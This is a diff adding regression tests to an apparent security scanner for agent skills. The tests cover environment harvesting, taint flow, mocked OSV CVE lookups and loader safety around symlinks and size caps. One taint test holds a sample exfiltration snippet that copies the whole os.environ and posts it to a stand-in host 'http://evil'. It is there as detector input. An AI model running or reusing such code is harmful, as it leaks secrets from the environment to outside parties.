@@ -118,6 +118,17 @@ def test_dotenv_file_reference_still_flagged():
     assert "DL007" in rule_ids(DataLeakageAnalyzer().analyze([c]))
 
 
+def test_dl001_bare_environ_assignment_flagged():
+    # Regression: a bare whole-environment copy must be caught by DL001.
+    assert "DL001" in rule_ids(DataLeakageAnalyzer().analyze([comp("python", "e = os.environ")]))
+
+
+def test_dl001_environ_single_key_read_not_flagged():
+    # Single-key reads (subscript / .get) are scoped lookups, not harvesting.
+    code = "k = os.environ['HOME']\nv = os.environ.get('LANG')\n"
+    assert "DL001" not in rule_ids(DataLeakageAnalyzer().analyze([comp("python", code)]))
+
+
 # --------------------------------------------------------------------------
 # Dangerous code (AST + regex)
 # --------------------------------------------------------------------------
@@ -304,6 +315,27 @@ def test_taint_no_flow_no_finding():
     assert TaintAnalyzer().analyze([comp("python", code)]) == []
 
 
+def test_taint_whole_environ_assignment_to_network_is_critical():
+    # Regression: bare `e = os.environ` (whole-environment copy) -> network sink.
+    code = (
+        "import os, requests\n"
+        "env = os.environ\n"
+        "requests.post('http://evil', json=env)\n"
+    )
+    tt = [f for f in TaintAnalyzer().analyze([comp("python", code)]) if f.rule_id == "TT001"]
+    assert tt and tt[0].severity is Severity.CRITICAL
+
+
+def test_taint_environ_get_nonsecret_not_over_tainted():
+    # Single-key read of a non-secret must NOT be treated as a whole-env source.
+    code = (
+        "import os, requests\n"
+        "u = os.environ.get('USERNAME')\n"
+        "requests.post('http://ok', json={'u': u})\n"
+    )
+    assert TaintAnalyzer().analyze([comp("python", code)]) == []
+
+
 # --------------------------------------------------------------------------
 # Dependencies
 # --------------------------------------------------------------------------
@@ -375,6 +407,69 @@ def test_requirements_extras_and_direct_url():
     ids = rule_ids(findings)
     assert "SC001" in ids        # requests range (extras stripped)
     assert "SC007" in ids        # direct-url dep
+
+
+# --------------------------------------------------------------------------
+# OSV.dev live CVE path — mocked, never touches the network
+# --------------------------------------------------------------------------
+class _FakeOSVResp:
+    def __init__(self, data: bytes):
+        self._data = data
+
+    def read(self):
+        return self._data
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, *exc):
+        return False
+
+
+def _patch_urlopen(monkeypatch, *, body=None, exc=None):
+    import pharos_skill_inspector.analyzers.dependencies as D
+
+    def fake_urlopen(req, timeout=None):
+        if exc is not None:
+            raise exc
+        return _FakeOSVResp(body)
+
+    monkeypatch.setattr(D.urllib.request, "urlopen", fake_urlopen)
+
+
+def test_osv_live_flags_vulnerable_dep(monkeypatch):
+    body = json.dumps({"results": [{"vulns": [{"id": "GHSA-test-1234"}]}, {}]}).encode()
+    _patch_urlopen(monkeypatch, body=body)
+    c = comp("text", "requests==2.31.0\nflask==3.0.0\n", path="requirements.txt")
+    findings = DependencyAnalyzer(use_network=True).analyze([c])
+    sc004 = [f for f in findings if f.rule_id == "SC004"]
+    assert sc004, "expected a live OSV finding"
+    assert "GHSA-test-1234" in sc004[0].message
+    assert sc004[0].confidence == 0.9          # exact pin -> high confidence
+
+
+def test_osv_live_no_vuln_no_finding(monkeypatch):
+    body = json.dumps({"results": [{}, {}]}).encode()
+    _patch_urlopen(monkeypatch, body=body)
+    c = comp("text", "requests==2.31.0\nflask==3.0.0\n", path="requirements.txt")
+    assert "SC004" not in rule_ids(DependencyAnalyzer(use_network=True).analyze([c]))
+
+
+def test_osv_urlerror_falls_back_to_offline(monkeypatch):
+    import pharos_skill_inspector.analyzers.dependencies as D
+    _patch_urlopen(monkeypatch, exc=D.urllib.error.URLError("no network"))
+    # requests 2.19.1 is present in the offline fallback DB.
+    c = comp("text", "requests==2.19.1\n", path="requirements.txt")
+    sc004 = [f for f in DependencyAnalyzer(use_network=True).analyze([c]) if f.rule_id == "SC004"]
+    assert sc004 and "CVE-2018-18074" in sc004[0].message
+    assert "offline" in sc004[0].title.lower()
+
+
+def test_osv_malformed_json_falls_back_to_offline(monkeypatch):
+    _patch_urlopen(monkeypatch, body=b"not valid json {{{")
+    c = comp("text", "requests==2.19.1\n", path="requirements.txt")
+    findings = DependencyAnalyzer(use_network=True).analyze([c])
+    assert any(f.rule_id == "SC004" and "offline" in f.title.lower() for f in findings)
 
 
 # --------------------------------------------------------------------------
@@ -544,6 +639,54 @@ def test_load_zip_rejects_too_many_entries(tmp_path, monkeypatch):
             zf.writestr(f"f{i}.txt", "x")
     with pytest.raises(ValueError, match="too many entries"):
         L.load(str(zpath))
+
+
+# --------------------------------------------------------------------------
+# Directory-scan safety (symlinks / path escapes / caps)
+# --------------------------------------------------------------------------
+def test_loader_skips_symlinked_file(tmp_path):
+    skill_dir = tmp_path / "skill"
+    skill_dir.mkdir()
+    (skill_dir / "SKILL.md").write_text("# ok\n")
+    secret = tmp_path / "outside_secret.txt"
+    secret.write_text("PRIVATE_KEY=0xdeadbeef\n")
+    (skill_dir / "link.txt").symlink_to(secret)  # points outside the scan root
+    skill = load(str(skill_dir))
+    try:
+        paths = [c.path for c in skill.components]
+        assert "link.txt" not in paths           # symlink never read
+        assert any(p.lower().endswith("skill.md") for p in paths)
+    finally:
+        skill.cleanup()
+
+
+def test_loader_caps_file_count(tmp_path, monkeypatch):
+    import pharos_skill_inspector.loader as L
+    monkeypatch.setattr(L, "_MAX_TOTAL_FILES", 3)
+    d = tmp_path / "many"
+    d.mkdir()
+    for i in range(10):
+        (d / f"f{i}.txt").write_text("x")
+    skill = L.load(str(d))
+    try:
+        assert len(skill.components) == 3
+        assert any("truncated" in e for e in skill.errors)
+    finally:
+        skill.cleanup()
+
+
+def test_loader_caps_total_bytes(tmp_path, monkeypatch):
+    import pharos_skill_inspector.loader as L
+    monkeypatch.setattr(L, "_MAX_TOTAL_BYTES", 5)
+    d = tmp_path / "big"
+    d.mkdir()
+    (d / "a.txt").write_text("x" * 100)
+    (d / "b.txt").write_text("y" * 100)
+    skill = L.load(str(d))
+    try:
+        assert any("exceeds" in e for e in skill.errors)
+    finally:
+        skill.cleanup()
 
 
 def test_cli_clone_failure_returns_2(monkeypatch, capsys):
